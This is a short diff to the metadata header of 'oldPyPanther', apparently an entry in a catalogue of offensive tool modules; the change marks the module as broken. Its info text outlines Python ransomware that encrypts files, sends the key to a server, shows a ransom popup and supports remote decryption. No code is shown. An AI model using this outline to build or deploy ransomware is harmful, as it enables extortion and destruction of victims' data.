@@ -1,4 +1,5 @@
 #!name##oldPyPanther
+#!FLAG_broken##True
 #!itemType##module
 #!fileType##PY_MOD
 #!info##A ransomware module written in Python. It encrypts files, sends the encryption key to the server, and displays a popup window informing about the infection with an input field for the decryption key; decryption can also be triggered remotely. Files are indexed using three filters: by file extensions, by ignoring specific substrings in directory names, and by checking whether a given string appears in the filename. Warning: use caution during testing, as you may encrypt your own files.
